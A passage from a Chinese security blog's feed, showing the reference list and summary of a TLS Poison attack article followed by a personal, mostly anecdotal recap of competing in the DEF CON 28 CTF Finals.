emVkZHl1Lmx1QGdtYWlsLmNvbQ==|base64 -d</p><p>欢迎大家指出文章的错误，也欢迎对协议安全等内容感兴趣的同学一起交流学习！</p><h2 id="Acknowledgements"><a href="#Acknowledgements" class="headerlink" title="Acknowledgements"></a>Acknowledgements</h2><p>非常感谢在整个流程中帮助我的同学、朋友们，特别感谢 @George 在调试过程中对于我这个萌新不耐我烦的帮助，感谢 @Joshua Maddux @zhaojin 等人在此前对该类型攻击做出的贡献，感谢 @rebirth @chuye 对本文的 Review 指出了本文之前不少的错误。</p><p>另外感谢一下小编负责且耐心的编辑，编辑这么长的文章真是辛苦小编了。</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="https://i.blackhat.com/USA-20/Wednesday/us-20-Maddux-When-TLS-Hacks-You.pdf" target="_blank" rel="noopener">When TLS Hacks You</a></p><p><a href="https://www.youtube.com/watch?v=qGpAJxfADjo" target="_blank" rel="noopener">DEF CON Safe Mode - Joshua Maddux - When TLS Hacks You</a></p><p><a href="https://github.com/jmdx/TLS-poison" target="_blank" rel="noopener">TLS Poison</a></p><p><a href="https://github.com/ctz/rustls" target="_blank" rel="noopener">rustls</a></p><p><a href="https://tools.ietf.org/html/rfc5246" target="_blank" rel="noopener">RFC 5246: The Transport Layer Security (TLS) Protocol Version 1.2</a></p><p><a href="https://tools.ietf.org/html/rfc5077" target="_blank" rel="noopener">RFC 5077: Transport Layer Security (TLS) Session Resumption without Server-Side State</a></p><p><a href="https://tools.ietf.org/html/rfc8446" target="_blank" rel="noopener">RFC 8446: The Transport Layer Security (TLS) Protocol Version 1.3</a></p><p><a href="https://tools.ietf.org/html/rfc3484" target="_blank" rel="noopener">RFC 3484: Default Address Selection for Internet Protocol version 6 (IPv6)</a></p><p><a href="https://tools.ietf.org/html/rfc6724" target="_blank" rel="noopener">RFC 6724: Default Address Selection for Internet Protocol Version 6 (IPv6)</a></p><p><a href="https://en.wikipedia.org/wiki/Transport_Layer_Security" target="_blank" rel="noopener">Transport Layer Security</a></p><p><a href="https://devcentral.f5.com/s/articles/TLS-Stateful-vs-Stateless-Session-Resumption" target="_blank" rel="noopener">TLS Stateful vs Stateless Session Resumption</a></p><p><a href="https://www.venafi.com/blog/tls-session-resumption" target="_blank" rel="noopener">TLS Session Resumption</a></p><p><a href="https://www.ibm.com/support/knowledgecenter/SSLTBW_2.3.0/com.ibm.zos.v2r3.hale001/ipv6d0021002286.htm" target="_blank" rel="noopener">Default destination address selection</a></p><p><a href="https://docs.google.com/presentation/d/1Zq0zMaKh5ONK8twrQc-8cp0b1QuboOm6VHlQl3i315o/edit?usp=sharing" target="_blank" rel="noopener">When TLS hacks you: TLS + SSRF = RCE by ducnt</a></p><p><a href="https://github.com/dfyz/ctf-writeups/tree/master/hxp-2020/security%20scanner" target="_blank" rel="noopener">hxp 2020</a></p><p><a href="https://www.zhaoj.in/read-6681.html" target="_blank" rel="noopener">基于 A 和 AAAA 记录的一种新 DNS Rebinding 姿势–从西湖论剑2020 Web HelloDiscuzQ 题对 Blackhat 上的议题做升华</a></p></body></html>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;这是《一篇文章带你读懂 XXX 攻击》系列的第二篇文章，本篇文章主要讲述 TLS Poison 攻击对应的三种攻击方式、一些可能算是“新”的 DNS Rebinding 技巧以及一些关于 IP 选择探索等内容。&lt;/p&gt;
&lt;blockquote class=&quot;colorquote success&quot;&gt;&lt;p&gt;文章首发于雷神众测，分为系列文章：&lt;/p&gt;
&lt;p&gt;一篇文章带你读懂 TLS Poison 攻击（一）&lt;a href=&quot;https://mp.weixin.qq.com/s/tAba3-qb5YGtlzH7y6PFvg&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://mp.weixin.qq.com/s/tAba3-qb5YGtlzH7y6PFvg&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;一篇文章带你读懂 TLS Poison 攻击（二）&lt;a href=&quot;https://mp.weixin.qq.com/s/aIWcpIXs-jQoMXuEppj3TQ&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://mp.weixin.qq.com/s/aIWcpIXs-jQoMXuEppj3TQ&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;一篇文章带你读懂 TLS Poison 攻击（三）&lt;a href=&quot;https://mp.weixin.qq.com/s/vBAeGaeBKnSyXUL_qmr7Gg&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://mp.weixin.qq.com/s/vBAeGaeBKnSyXUL_qmr7Gg&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;一篇文章带你读懂 TLS Poison 攻击（四）&lt;a href=&quot;https://mp.weixin.qq.com/s/YdV9Hlpz38d09JOdtf2PxA&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://mp.weixin.qq.com/s/YdV9Hlpz38d09JOdtf2PxA&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;&lt;/body&gt;&lt;/html&gt;
    
    </summary>
    
    
      <category term="Sec" scheme="https://blog.zeddyu.info/categories/Sec/"/>
    
    
      <category term="Sec" scheme="https://blog.zeddyu.info/tags/Sec/"/>
    
  </entry>
  
  <entry>
    <title>DEFCON 28 Final 杂记</title>
    <link href="https://blog.zeddyu.info/2020/10/15/Defcon28final/"/>
    <id>https://blog.zeddyu.info/2020/10/15/Defcon28final/</id>
    <published>2020-10-15T02:11:50.000Z</published>
    <updated>2021-09-27T17:45:58.716Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><p>距离 DEFCON 28 Final 已经过去了两个多月了，本来结束就写写，但是因为一些后来事耽搁了，现在补一下这次参赛的一些经历。</p><a id="more"></a><p>[TOC]</p><h1 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h1><p><strong>前言：本篇文章不代表任何组织社团的观点，全文仅代表个人看法以及意见。如有冒犯请联系我进行必要的修改。</strong></p><p>由于今年疫情的原因，今年的 DEFCON Final 在线上举办，我有幸与 Tea Deliverers 一起参与了 DEFCON 28 CTF Final ，最终在比赛中取得了第四的成绩。本文我会主要从参赛经历见闻以及一些对于 Web 题的分析入手来写这篇文章，由于 Web 题过分简单，也没什么特别好分析的，所以没什么技术营养，可以权当小说看看，博君一笑。并且为了避免一些不必要的麻烦，全文涉及到姓名 ID 处我都尽量以某师傅进行称呼。</p><h1 id="The-First-DEFCON-Final-In-My-Life"><a href="#The-First-DEFCON-Final-In-My-Life" class="headerlink" title="The First DEFCON Final In My Life"></a>The First DEFCON Final In My Life</h1><h2 id="Simple-Introduction"><a href="#Simple-Introduction" class="headerlink" title="Simple Introduction"></a>Simple Introduction</h2><p>今年的赛制我这里简单介绍一下，想详细了解的可以参考一下官网:<a href="https://oooverflow.io/dc-ctf-2020-finals/" target="_blank" rel="noopener">https://oooverflow.io/dc-ctf-2020-finals/</a></p><p>题目主要分为两种类型，一种类型是 AWD ，另一种是 KOH ，AWD 就比较常见了，就是攻防题目，这次也是我第一次接触 KOH 这种题目类型，这种题目类型往往是题目中有自己的一个积分规则，然后让各个队伍在每个 ROUND 尽可能拿到更多的分数，每个 ROUND 取前 N 名，每个 ROUND 结束统计分数并给前 N 名的队伍在总榜的 KOH 列加分。在 KOH 中如何拿更多的分数就是这个题目的出题点了，这些出题点可以有一些设置的漏洞或者什么其他的方式让你可以在一个 ROUND 厘面得更多的分数，简单来说，你可以理解 KOH 给了你一个游戏，每个队伍每5分钟玩一把游戏，你可以通过对游戏分析来找到一些 bug 或者什么其他的点，通过这个点来帮助你像“开挂”一样得分。</p><h2 id="Time"><a href="#Time" class="headerlink" title="Time"></a>Time</h2><blockquote><p>​    We’ll start <a href="https://www.timeanddate.com/worldclock/fixedtime.html?msg=Start+of+DEF+CON+CTF+finals&amp;iso=20200807T05&amp;p1=127" target="_blank" rel="noopener">5 AM Las Vegas time on Friday, August 7th</a> (4 AM for setup).</p><p>Here is the schedule (Nevada time == PDT):</p><ul><li>Shift 1: Friday 4am setup, 5am start, 1pm end</li><li><strong>First public recap: <a href="https://www.timeanddate.com/worldclock/fixedtime.html?msg=CTF+recap+stream&amp;iso=20200807T14&amp;p1=127" target="_blank" rel="noopener">Friday 2 PM</a></strong></li><li>Shift 2: Friday 9pm setup, 10pm start, Saturday 6am end</li><li><strong>Second public recap: <a href="https://www.timeanddate.com/worldclock/fixedtime.html?msg=CTF+recap+stream&amp;iso=20200808T13&amp;p1=127" target="_blank" rel="noopener">Saturday 1 PM</a></strong></li><li>Shift 3: Saturday 2pm setup, 3pm start, 11pm end</li><li>Shift 4: Sunday 7am setup, 8am start, 4pm end</li><li><strong>Third public recap: <a href="https://www.timeanddate.com/worldclock/fixedtime.html?msg=CTF+recap+stream&amp;iso=20200809T12&amp;p1=127" target="_blank" rel="noopener">Sunday at noon</a> (during the game)</strong></li></ul></blockquote><p>这轮的时间可谓是相当的所谓的“健康”了，上述时间表翻译到北京时间过来就是：</p><blockquote><ul><li>Shift 1: Friday 7pm setup, 8pm start, Saturday 4am end</li><li>Shift 2: Saturday 12am setup, 1pm start,  9pm end</li><li>Shift 3: Sunday 5am setup, 6am start, 2pm end</li><li>Shift 4: Sunday 10pm setup, 11pm start, Monday 7am end</li></ul></blockquote><p>也就是说每个 Shift 比赛进行8小时，每个 Shift 中间间隔8小时，而且是正正好好的8小时 =.= 这就是所谓的“健康”赛制，但是我从比赛场地回家休息再搞会怎么都没剩多少时间了，我觉得还不如硬肝好了（反正我觉得没几个队像我这个混子一样8小时全睡），而且还分了4轮，这是真的肝，于是那几天我的世界就变成了一天16小时的世界，8小时看题当混子，8小时睡觉。（</p><h2 id="Stealth-Ports"><a href="#Stealth-Ports" class="headerlink" title="Stealth Ports"></a>Stealth Ports</h2><p>在 AWD 赛制中， OOO 加入了 Stealth Ports 这种机制：</p><blockquote><p>​    New this year, each service will have a STEALTH port alongside it’s normal port. The stealth port will be 10000+SERVICE_PORT, so If a challenge listens on port 1337, the stealth port will be 11337. The stealth port hits the same exact challenge endpoint as the normal port, but traffic through that port will not be released to the victim team. But beware: maintaining backdoor access to other teams ain’t cheap! If your team sends any traffic through a service’s stealth port to a given team, you will only receive half points for stealing that team’s flag that round.</p></blockquote><p>也就是说主办方给大家开放了一个不给流量的端口，如果有攻击方成功通过这个端口获取到防守方的 Flag ，则 Flag 分会减半。也就是说这相当于一个隐形的端口，对于一血的队伍比较有利，可以通过这个端口迅速打全场而不被捕获到流量，但是得分会减半，也算是一种双刃剑。</p><h2 id="Before-Shift-1"><a href="#Before-Shift-1" class="headerlink" title="Before Shift 1"></a>Before Shift 1</h2><p>开始之前我也并没有什么特别的准备，经过一番讨论决定我们还是在某师傅的公司里打比赛，这些讨论包括但不限于比赛场地要不要选一个别墅啥的，但是考虑到网络问题还是决定了在公司里，以及大家要不要一起先吃个饭做个赛前动员什么的。所以就在开赛前2小时多，也就是下午5点多，我随我 Mentor 就一起去跟队员们吃了个饭，也算是跟大家认识认识，然后就被排在了 Leader 旁边坐（紧张死了，有种领导夹菜我转桌的冲动），然后 Leader 旁边又是那个统治强网杯的“那个男人”（又紧张死了，第一次跟这种可怕的巨型大佬生物进行交流），整个会餐就这样在对于我来说在一种不可名状的氛围下结束了。XD（感觉其他人真的是又强又壮，<small>就我一个可怜弱小的小菜鸡</small></p><h2 id="Shift-1"><a href="#Shift-1" class="headerlink" title="Shift 1"></a>Shift 1</h2><p>由于之前接入等等准备工作师傅们都做完了，我便在 setup 就开混了，于是就尬等比赛开始。第一天放了貌似两个二进制的 AWD ，还有一个 KOH ，KOH 给的是一个 21 点的游戏，跟普通的 21 点游戏差不多，有一个庄家，所有队伍都进行下注，要牌超过 21 点的队伍就在当前 ROUND 直接出局，剩下的队伍继续进行游戏，通过这样的方式决出游戏积分前五名，在对应队伍的 KOH 分数上进行加分。</p><p>一开始没什么队伍得分，由于给出的是 Web 地址，于是我们一开始就当作 Web 题来做了，各种测了测，然后发现虽然这个 Web 平台是 Flask 并且开了 Debug ，一个上传错误直接跳到了 Debug 错误界面，但是由于没有找到其他地方有洞可以利用来获取 PIN 码，这条路就作废了。</p><p>然后十多分钟后，我们渐渐发现这个可以看到全局队伍所有人的上传文件，虽然文件有一定格式，并且类似一个指令类型的文件，虽然我们当时看不懂，但是发现 A0E 在得分之后，我们拿 A0E 的过来用就可以直接得分了（</p><p>后面才知道我上传的文件是修改了我们每次下注的积分，因为初始的时候每个队都一样，一次把自家身家200一次下完，而输的概率又很大，基本立马就出局了，然而通过一开始直接下注 1 个积分，这样就可以立马稳住战局，至少可以不会立马出局就可以排前五上分了。于是我们一开始就在 KOH 上分了，就这样通过 KOH 得分，我们稳住了前一天的排名，第一天的得分也就基本全都来自于 KOH 。</p><h2 id="Shift-2-amp-Shift-3"><a href="#Shift-2-amp-Shift-3" class="headerlink" title="Shift 2 &amp; Shift 3"></a>Shift 2 &amp; Shift 3</h2><p>由于时间也比较久远了，我记的不是特别清楚，这两个 Shift 就放一起了。由于之前貌似大家没怎么打 DEFCON QUALS 或者说打了的师傅这次 Final 没打？我们一开始并没有发现 KOH 那个题是改自 DEFCON QUALS Fountain OOO REliving ，是一个 Golly 相关的逆向题，当时看 QUALS 的 WriteUp 也是相当崩溃的，由于我这个小菜鸡没什么逆向基础，跟某师傅硬着头皮搞也没怎么搞出来，而这个还是升级版，当时看这个题目的附件图还是一脸懵逼的：</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://github.com/o-o-overflow/dc2020f-casinooo-life-blackjack/blob/master/controller.png?raw=true" alt=""></p><p>在 Golly 上瞎弄更是相当懵逼。虽然逆向帮不上啥，但是我还是每个 ROUND 都看一看各个队伍的表现以及策略，然后发现感觉也可能是一个数学期望题（？），我就尝试着算一下每次下注多少才能让我们每个 ROUND 大概率能在现有的队伍策略中胜出，然后通过不断的试不断的改，后面基本上靠运气能拿下不少分（</p><p>后面我们 AWD 分数也起来了，截止到 Shift 2 结束，我截了一张当时的图。（看着当时的 KOH 感觉当时运气真好</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20201013001429.png" alt=""></p><p>后面在 Shift 3 的时候，这个 21 点的题目一开始没多久就下了，于是我又开始混起来了，也就随便看看平台，然后看看队友们在干啥，中间貌似有一个 RPG 游戏的 AWD 题目，当时看他们玩起来感觉很有意思，就是大家通过操控自己的角色进行对应的操作拿 Flag ，而且还是具有一定实时操作性，总之看起来他们在打这个游戏非常有意思 XD</p><p>然后后面又放了两个 KOH ，一个是非常 Geek 的弹球游戏，还有一个是开飞船打飞船的游戏，两个都是逆向，也让我混的是理直气壮（大雾），虽然我想尽可能地帮忙，但是真是菜的真实，也就到处看看有什么可以帮忙的地方，比如，拿外卖（海盗虾饭外卖是真好吃，泡面真香，好久没吃泡面了，呜呜呜TAT）</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20201013003438.jpg" alt=""></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztY